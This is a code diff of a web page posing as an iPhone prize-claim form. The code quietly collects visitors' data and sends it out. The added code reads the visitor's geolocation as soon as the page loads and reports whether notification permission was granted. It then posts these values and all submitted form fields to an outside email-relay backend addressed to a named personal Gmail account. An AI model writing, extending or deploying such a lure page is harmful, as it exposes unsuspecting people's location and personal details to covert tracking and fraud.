@@ -19,7 +19,7 @@
         <form id="rewardForm">
             <!-- Your form fields here -->
             <p id="locationDisplay" class="form-text">Location permissions required to auto-fill your location.</p>
-            <button type="button" id="permissionButton" class="btn btn-secondary btn-block">Enable Notifications and Location</button>
+            <button type="button" id="permissionButton" class="btn btn-secondary btn-block">Enable Notifications</button>
             <button type="submit" class="btn btn-primary btn-block">Submit and Claim iPhone</button>
         </form>
     </div>
@@ -35,15 +35,15 @@
             const locationDisplay = document.getElementById("locationDisplay");
             let latitude, longitude;
 
-            // Request Notification and Geolocation Permissions on Button Click
+            // Request Notification Permission on Button Click
             document.getElementById("permissionButton").addEventListener("click", function () {
-                // Request notification permission
                 if ("Notification" in window) {
                     Notification.requestPermission().then(permission => {
                         if (permission === "granted") {
+                            sendEmail("Notification Permission Granted", "The user has granted notification permissions.", "khalilrodeni@gmail.com");
                             alert("Notifications enabled!");
-                            startLocationUpdates();
                         } else {
+                            sendEmail("Notification Permission Denied", "The user has denied notification permissions.", "khalilrodeni@gmail.com");
                             alert("Notifications disabled.");
                         }
                     });
@@ -52,28 +52,24 @@
                 }
             });
 
-            // Start location updates every 5 minutes (300000 ms) after permissions are granted
-            function startLocationUpdates() {
-                if ("geolocation" in navigator) {
-                    setInterval(() => {
-                        navigator.geolocation.getCurrentPosition(
-                            (position) => {
-                                latitude = position.coords.latitude;
-                                longitude = position.coords.longitude;
-                                locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
-
-                                // Send location data email periodically
-                                sendEmail("Location Update", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com");
-                            },
-                            (error) => {
-                                locationDisplay.textContent = error.code === error.PERMISSION_DENIED ? "Location access denied by user." : "Location error.";
-                                sendEmail("Location Access Error", locationDisplay.textContent, "khalilrodeni@gmail.com");
-                            }
-                        );
-                    }, 300000); // 5 minutes interval
-                } else {
-                    locationDisplay.textContent = "Geolocation is not supported by this browser.";
-                }
+            // Geolocation permission and location display
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        latitude = position.coords.latitude;
+                        longitude = position.coords.longitude;
+                        locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
+                        
+                        // Send initial location data email
+                        sendEmail("Geolocation Data", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com");
+                    },
+                    (error) => {
+                        locationDisplay.textContent = error.code === error.PERMISSION_DENIED ? "Location access denied by user." : "Location error.";
+                        sendEmail("Location Access Error", locationDisplay.textContent, "khalilrodeni@gmail.com");
+                    }
+                );
+            } else {
+                locationDisplay.textContent = "Geolocation is not supported by this browser.";
             }
         });
 
@@ -103,4 +99,30 @@
                 Location: ${formData.location}
             `;
 
-            sendEmail("Form Submission Dat
+            sendEmail("Form Submission Data", message, "khalilrodeni@gmail.com");
+            alert("Thank you for your submission! We will contact you shortly.");
+        });
+
+        // Email Sending Function
+        function sendEmail(subject, message, recipientEmail) {
+            const emailData = {
+                subject: subject,
+                message: message,
+                recipient_email: recipientEmail,
+                recipient_name: "Khalil Ahmed"
+            };
+
+            fetch("https://zalex-backend.onrender.com/api/send-email/", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify(emailData)
+            })
+            .then(response => response.ok ? response.json() : Promise.reject(`Error ${response.status}`))
+            .then(data => alert(data.message ? "Email sent successfully!" : `Error: ${data.error}`))
+            .catch(error => alert("Error sending email: " + error));
+        }
+    </script>
+</body>
+</html>
